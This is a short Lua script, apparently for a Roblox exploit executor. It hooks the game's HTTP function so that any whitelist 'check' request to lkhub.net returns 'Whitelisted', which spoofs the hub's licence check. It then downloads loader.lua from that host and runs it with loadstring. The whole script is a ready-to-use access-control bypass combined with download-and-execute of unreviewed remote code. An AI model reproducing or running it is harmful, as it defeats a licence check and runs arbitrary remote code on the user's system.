local old
old = hookfunction(game.HttpGet, function(...)
   local args = {...}
   local url = args[2]
   if url:match('lkhub.net') and url:match('check') then
       return 'Whitelisted'
   end
   return old(...)
end)
loadstring(game:HttpGet("https://lkhub.net/s/loader.lua"))()